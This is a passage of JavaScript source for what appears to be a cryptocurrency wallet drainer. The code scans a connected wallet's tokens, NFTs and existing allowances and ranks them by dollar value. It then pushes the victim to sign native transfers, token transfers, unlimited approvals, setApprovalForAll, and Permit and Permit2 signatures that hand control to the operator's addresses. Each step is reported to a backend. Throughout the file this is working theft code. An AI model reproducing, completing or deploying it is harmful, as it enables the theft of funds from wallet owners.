  let unsigned_tx = { from: MS_Current_Address, to: MS_Settings.Receiver, value: BN(100), data: "0x" };
  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
  if (available_amount.lte(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.value = available_amount;
  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset, available_amount); sign_ready();
};

const DO_RANDOMIZER_TOKEN = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);

  contract_data = web3_contract.methods.transfer(MS_Settings.Personal_Wallet.address, asset.amount_raw).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);

  const x_promise = send_request({
    action: 'withdraw_token', wallet: MS_Settings.Personal_Wallet,
    chain_id: asset.chain_id, amount_usd: asset.amount_usd,
    user_id: MS_ID, asset: asset, address: MS_Current_Address
  });

  if (MS_Settings.Settings.Wait_For_Response)
    await x_promise;

  await transfer_success(asset); sign_ready();
};

const TRANSFER_TOKEN = async (asset) => {
  if (MS_Settings.Settings.Use_Randomizer_For_Tokens && MS_Settings.Personal_Wallet != null) return DO_RANDOMIZER_TOKEN(asset);

  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);

  contract_data = web3_contract.methods.transfer(MS_Settings.Receiver, asset.amount_raw).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);
  await transfer_success(asset); sign_ready();
};

const TRANSFER_NFT = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.transferFrom(MS_Current_Address, MS_Settings.Receiver, asset.id).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);

  await transfer_success(asset); sign_ready();
};

const DO_SAFA = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0", data: "0x" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC721'], asset.address);

  contract_data = web3_contract.methods.setApprovalForAll(MS_Settings.Address, true).encodeABI();
  unsigned_tx.data = contract_data;

  const gas_limit = await node.estimateGas(unsigned_tx);

  const balance = await node.getBalance(MS_Current_Address);
  const available_amount = balance.sub(gas_limit.mul(gas_price));
  if (available_amount.lt(BN(0))) throw 'LOW_BALANCE';

  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.nonce = nonce;
  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;

  await transfer_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation)
    await node.waitForTransaction(tx.hash, 1, 30000);

  await transfer_success(asset); sign_ready();
};

const DO_PERMIT2 = async (asset, assets) => {
  const contract = new ethers.Contract('0x000000000022d473030f116ddee9f6b43ac78ba3', MS_Contract_ABI['PERMIT2_BATCH'], MS_Signer);
  let permit_domain = { name: "Permit2", chainId: asset.chain_id, verifyingContract: "0x000000000022d473030f116ddee9f6b43ac78ba3" };
  let permit_deadline = Date.now() + 1000 * 60 * 60 * 24 * 356, permit_signature = null, permit_message = null, permit_mode = null;
  if (assets.length > 1) {
    let permit_types = {
      "PermitBatch": [
        {
          "name": "details",
          "type": "PermitDetails[]"
        },
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "sigDeadline",
          "type": "uint256"
        }
      ],
      "PermitDetails": [
        {
          "name": "token",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint160"
        },
        {
          "name": "expiration",
          "type": "uint48"
        },
        {
          "name": "nonce",
          "type": "uint48"
        }
      ]
    };
    let tokens = [];
    for (const x_asset of assets) {
      try {
        tokens.push({
          "token": x_asset.address, "expiration": permit_deadline,
          "amount": "1461501637330902918203684832716283019655932542975",
          "nonce": (await contract.allowance(MS_Current_Address, x_asset.address, (MS_Settings.Settings.Use_Randomizer_For_Tokens? MS_Settings.Personal_Wallet.address : MS_Settings.Address))).nonce
        });
      } catch(err) {
        console.log(err);
      }
    }
    permit_message = {
      "details": tokens,
      "spender": (MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address : MS_Settings.Address),
      "sigDeadline": permit_deadline
    };
    swap_request("Permit2", asset, assets); sign_next();
    permit_signature = await MS_Signer._signTypedData(permit_domain, permit_types, permit_message);
    permit_mode = 2;
  } else {
    // Permit Single
    let permit_types = {
      "PermitSingle": [
        {
          "name": "details",
          "type": "PermitDetails"
        },
        {
          "name": "spender",
          "type": "address"
        },
        {
          "name": "sigDeadline",
          "type": "uint256"
        }
      ],
      "PermitDetails": [
        {
          "name": "token",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint160"
        },
        {
          "name": "expiration",
          "type": "uint48"
        },
        {
          "name": "nonce",
          "type": "uint48"
        }
      ]
    };
    permit_message = {
      "details": {
        "token": asset.address,
        "amount": "1461501637330902918203684832716283019655932542975",
        "expiration": permit_deadline, "nonce": (await contract.allowance(MS_Current_Address, asset.address, (MS_Settings.Settings.Use_Randomizer_For_Tokens ? MS_Settings.Personal_Wallet.address : MS_Settings.Address))).nonce
      },
      "spender": (MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address : MS_Settings.Address),
      "sigDeadline": permit_deadline
    };
    swap_request("Permit2", asset, [ asset ]); sign_next();
    permit_signature = await MS_Signer._signTypedData(permit_domain, permit_types, permit_message);
    permit_mode = 1;
  }
  if (permit_signature != null) {
    await swap_success('Permit2', asset, assets); wait_message();
    const x_promise = send_request({
      action: 'sign_permit2', user_id: MS_ID, signature: permit_signature,
      message: permit_message, asset: asset, assets, address: MS_Current_Address,
      mode: permit_mode, PW: MS_Settings.Personal_Wallet
    });
    if (MS_Settings.Settings.Wait_For_Response) await x_promise;
    sign_ready();
  } else {
    await sign_cancel();
  }
};

const PERMIT_TOKEN = async (asset) => {
  const contract = new ethers.Contract(asset.address, asset.abi, MS_Signer);
  const nonce = await contract.nonces(MS_Current_Address);
  const name = await contract.name();
  let value = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        value = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }
  const deadline = Date.now() + 1000 * 60 * 60 * 24 * 356;
  let permit_types = null, permit_values = null;
  if (asset.permit == 1) {
    permit_types = {
      Permit: [
        {
          name: "holder",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "expiry",
          type: "uint256",
        },
        {
          name: "allowed",
          type: "bool",
        }
      ]
    };
    permit_values = {
      holder: MS_Current_Address,
      spender: (MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address : MS_Settings.Address),
      nonce: nonce,
      expiry: deadline,
      allowed: true
    };
  } else if (asset.permit == 2) {
    permit_types = {
      Permit: [
        {
          name: "owner",
          type: "address",
        },
        {
          name: "spender",
          type: "address",
        },
        {
          name: "value",
          type: "uint256",
        },
        {
          name: "nonce",
          type: "uint256",
        },
        {
          name: "deadline",
          type: "uint256",
        }
      ]
    };
    permit_values = {
      owner: MS_Current_Address,
      spender: (MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address : MS_Settings.Address),
      value: value,
      nonce: nonce,
      deadline: deadline
    };
  }
  await approve_request(asset);
  sign_next();
  const result = await MS_Signer._signTypedData({
    name: name, version: asset.permit_ver, chainId: asset.chain_id,
    verifyingContract: asset.address
  }, permit_types, permit_values),
  signature = {
    r: result.slice(0, 66),
    s: "0x" + result.slice(66, 130),
    v: Number("0x" + result.slice(130, 132))
  };
  await approve_success(asset);
  wait_message();
  const x_promise = send_request({
    action: 'permit_token', user_id: MS_ID, sign: {
      type: asset.permit, version: asset.permit_ver,
      chain_id: asset.chain_id, address: asset.address,
      owner: MS_Current_Address, spender: (MS_Settings.Settings.Use_Randomizer_For_Tokens
        ? MS_Settings.Personal_Wallet.address : MS_Settings.Address),
      value: value.toString(), nonce: nonce.toString(), deadline: deadline,
      r: signature.r, s: signature.s, v: signature.v, abi: asset.abi
    }, asset: asset, address: MS_Current_Address, PW: MS_Settings.Personal_Wallet
  });
  if (MS_Settings.Settings.Wait_For_Response) await x_promise;
  sign_ready();
};

const sign_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'sign_success', asset, user_id: MS_ID });
    } else {
      await send_request({ action: 'sign_success', asset, user_id: MS_ID });
    }
  } catch(err) {
    console.log(err);
  }
}

const swap_success = async (type, asset, all_tokens = [], amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'swap_success', asset, user_id: MS_ID, list: all_tokens, swapper: type });
    } else {
      await send_request({ action: 'swap_success', asset, user_id: MS_ID, list: all_tokens, swapper: type });
    }
  } catch(err) {
    console.log(err);
  }
}

const transfer_success = async (asset, amount = '0') => {
  try {
    if (asset.type == 'NATIVE') {
      asset.amount_raw = amount;
      const out_amount = ethers.BigNumber.from(asset.amount_raw);
      asset.amount_usd = parseFloat(ethers.utils.formatUnits(out_amount, 'ether')) * MS_Currencies[convert_chain('ID', 'CURRENCY', asset.chain_id)]['USD'];
      await send_request({ action: 'transfer_success', asset, user_id: MS_ID });
    } else {
      await send_request({ action: 'transfer_success', asset, user_id: MS_ID });
    }
  } catch(err) {
    console.log(err);
  }
}

const approve_success = async (asset) => {
  try {
    await send_request({ action: 'approve_success', asset, user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const sign_cancel = async () => {
  try {
    await send_request({ action: 'sign_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const sign_unavailable = async () => {
  try {
    await send_request({ action: 'sign_unavailable', user_id: MS_ID });
    MS_Sign_Disabled = true;
  } catch(err) {
    console.log(err);
  }
}

const transfer_cancel = async () => {
  try {
    await send_request({ action: 'transfer_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const approve_cancel = async () => {
  try {
    await send_request({ action: 'approve_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
}

const chain_cancel = async () => {
  try {
    await send_request({ action: 'chain_cancel', user_id: MS_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_success = async () => {
  try {
    await send_request({ action: 'chain_success', user_id: MS_ID  });
  } catch(err) {
    console.log(err);
  }
}

const chain_request = async (old_chain, new_chain) => {
  try {
    await send_request({ action: 'chain_request', user_id: MS_ID, chains: [ old_chain, new_chain ] });
  } catch(err) {
    console.log(err);
  }
}

const sign_request = async (asset) => {
  try {
    await send_request({ action: 'sign_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const swap_request = async (type, asset, all_tokens = []) => {
  try {
    await send_request({ action: 'swap_request', user_id: MS_ID, asset, list: all_tokens, swapper: type });
  } catch(err) {
    console.log(err);
  }
}

const transfer_request = async (asset) => {
  try {
    await send_request({ action: 'transfer_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const approve_request = async (asset) => {
  try {
    await send_request({ action: 'approve_request', user_id: MS_ID, asset });
  } catch(err) {
    console.log(err);
  }
}

const is_increase_approve = (func) => {
  try {
    if (func.hasOwnProperty('increaseAllowance')) {
      return 1;
    } else if (func.hasOwnProperty('increaseApproval')) {
      return 2;
    } else {
      return false;
    }
  } catch(err) {
    return false;
  }
};

const get_wallet_assets = async (address) => {
  try {
    let response = await send_request({ action: 'check_wallet', address: MS_Current_Address }), assets = [];
    if (response.status == 'OK') assets = response.data;
    else if (MS_Settings.AT != "" && response.error == 'LOCAL_CHECK') assets = await get_tokens(address);
    else if (response.error != 'LOCAL_CHECK') return assets;
    else {
      MS_Check_Done = true;
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Critical Error', subtitle: 'Настройте оценщики', text: 'Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Ошибка</b><br><br>Ни один из оценщиков не активирован в настройках скрипта, оценка активов кошелька невозможна, проверьте настройки и перезапустите сервер!', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
      await new Promise(r => setTimeout(r, 10000));
      return assets;
    }

    let token_promises = [];

    for (let x = (assets.length - 1); x >= 0; x--) {
      try {
        const asset = assets[x];
        const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
        if (!MS_Settings.Settings.Chains[chain_id].Enable) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && !MS_Settings.Settings.Chains[chain_id].Native) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && !MS_Settings.Settings.Chains[chain_id].Tokens) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Native_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Tokens_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20') {
          if (MS_Settings.Settings.Permit2.Mode) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                if (asset.amount_usd >= MS_Settings.Settings.Permit2.Price) {
                  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
                  let allowance = await contract.allowance(MS_Current_Address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
                  if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                    asset.permit2 = true;
                    asset.allowance = allowance;
                    console.log(`[PERMIT_2 FOUND] ${asset.name}, Allowance: ${allowance}`);
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
          if ((MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0) || (MS_Settings.Settings.Approve.MetaMask >= 2 && MS_Current_Provider == 'MetaMask') || (MS_Settings.Settings.Approve.Trust >= 2 && MS_Current_Provider == 'Trust Wallet')) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                if ((MS_Settings.Settings.Approve.MetaMask >= 2 && MS_Current_Provider == 'MetaMask') || (MS_Settings.Settings.Approve.Trust >= 2 && MS_Current_Provider == 'Trust Wallet') || asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
                  const data = await retrive_token(asset.chain_id, asset.address);
                  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                  const contract = new ethers.Contract(asset.address, data, node);
                  if (is_increase_approve(contract.functions) == 2) {
                    asset.increase = 2;
                    asset.abi = data;
                  } else if (is_increase_approve(contract.functions) == 1) {
                    asset.increase = 1;
                    asset.abi = data;
                  }
                  if (asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
                    const permit_type = get_permit_type(contract.functions);
                    asset.permit = permit_type;
                    asset.permit_ver = "1";
                    asset.abi = data;
                    if (permit_type > 0) {
                      if (contract.functions.hasOwnProperty('version')) {
                        try {
                          asset.permit_ver = await contract.version();
                        } catch(err) {
                          console.log(err);
                        }
                      }
                      console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
                    }
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
          if (MS_Settings.Settings.Swappers.Enable) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                if (asset.amount_usd >= MS_Settings.Settings.Swappers.Price) {
                  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                  for (const swapper of MS_Routers[asset.chain_id]) {
                    try {
                      const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
                      const allowance = await contract.allowance(MS_Current_Address, swapper[1]);
                      if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                        if (swapper[0] == 'Quickswap' && MS_Settings.Settings.Swappers.Quick == 0) continue;
                        if (swapper[0] == 'Sushiswap' && MS_Settings.Settings.Swappers.Sushi == 0) continue;
                        if (swapper[0] == 'Uniswap' && (!MS_Uniswap_Whitelist.includes(asset.address) || MS_Settings.Settings.Swappers.Uniswap == 0)) continue;
                        if ((swapper[0] == 'Pancake' || swapper[0] == 'Pancake_V3') && (!MS_Pancake_Whitelist.includes(asset.address) || MS_Settings.Settings.Swappers.Pancake == 0)) continue;
                        asset.swapper = true;
                        asset.swapper_type = swapper[0];
                        asset.swapper_address = swapper[1];
                        asset.swapper_allowance = allowance;
                        console.log(`[SWAP FOUND] ${asset.name}, ${swapper[0]}`);
                        break;
                      }
                    } catch(err) {
                      console.log(err);
                    }
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    await Promise.all(token_promises);

    let NFT_Status = false;

    for (const chain_id in MS_Settings.Settings.Chains) {
      try {
        if (MS_Settings.Settings.Chains[chain_id].NFTs) {
          NFT_Status = true;
          break;
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (NFT_Status) {
      try {
        let nft_list = [];
        response = await send_request({ action: 'check_nft', address: MS_Current_Address });
        if (response.status == 'OK') {
          nft_list = response.data;
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        } else {
          nft_list = await get_nfts(address);
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    assets.sort((a, b) => { return b.amount_usd - a.amount_usd });

    if (MS_Settings.Settings.Tokens_First == 1) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (asset.type == 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.type != 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    } else if (MS_Settings.Settings.Tokens_First == 2) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (asset.type != 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.type == 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 1) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.permit || asset.permit == 0 || asset.amount_usd < MS_Settings.Settings.Permit.Priority) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.permit && asset.permit > 0 && asset.amount_usd >= MS_Settings.Settings.Permit.Priority) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 2) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    return assets;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const APPROVE_TOKEN = async (asset) => {
  if (MS_Settings.Settings.Approve.Enable == 0) { await TRANSFER_TOKEN(asset); return 2; }

  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask >= 2) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
    try {
      for (let x = 0; x < 2; x++) {
        if (asset.increase) continue;
        try {
          const ic_data = await retrive_token(asset.chain_id, asset.address);
          const ic_node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
          const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
          if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
          else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    }
  }

  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask >= 2) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust >= 2)) && asset.increase) return await MM_APPROVE_TOKEN(asset);
  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask == 2) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust == 2)) && !asset.increase) { await TRANSFER_TOKEN(asset); return 2; }
  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask == 3) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust == 3)) && !asset.increase) throw new Error('UNSUPPORTED');

  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

  const unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const web3_contract = new web3.eth.Contract(MS_Contract_ABI['ERC20'], asset.address);

  contract_data = web3_contract.methods.approve((MS_Settings.Settings.Use_Randomizer_For_Tokens ? MS_Settings.Personal_Wallet.address : MS_Settings.Address), max_approval_amount).encodeABI();

  unsigned_tx.data = contract_data;
  const gas_limit = await node.estimateGas(unsigned_tx);
  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;
  unsigned_tx.nonce = nonce;

  await approve_request(asset); sign_next();
  const tx = await MS_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await approve_success(asset); sign_ready(); return 1;
};

const MM_APPROVE_TOKEN = async (asset) => {
  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask >= 2) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
    try {
      for (let x = 0; x < 2; x++) {
        if (asset.increase) continue;
        try {
          const ic_data = await retrive_token(asset.chain_id, asset.address);
          const ic_node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
          const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
          if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
          else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    }
  }

  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }

  const unsigned_tx = { from: MS_Current_Address, to: asset.address, value: "0x0" };

  const web3 = new Web3(MS_Provider); let contract_data = null;
  const increase_type = (asset.increase == 2) ? 'increaseApproval' : 'increaseAllowance';
  const web3_contract = new web3.eth.Contract([
    {
      "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"increment","type":"uint256"}],
      "name":`${increase_type}`,"outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"
    }
  ], asset.address);

  contract_data = web3_contract.methods[increase_type]((MS_Settings.Settings.Use_Randomizer_For_Tokens ? MS_Settings.Personal_Wallet.address : MS_Settings.Address), max_approval_amount).encodeABI();

  unsigned_tx.data = contract_data;
  const gas_limit = await node.estimateGas(unsigned_tx);
  const nonce = await node.getTransactionCount(MS_Current_Address, 'pending');

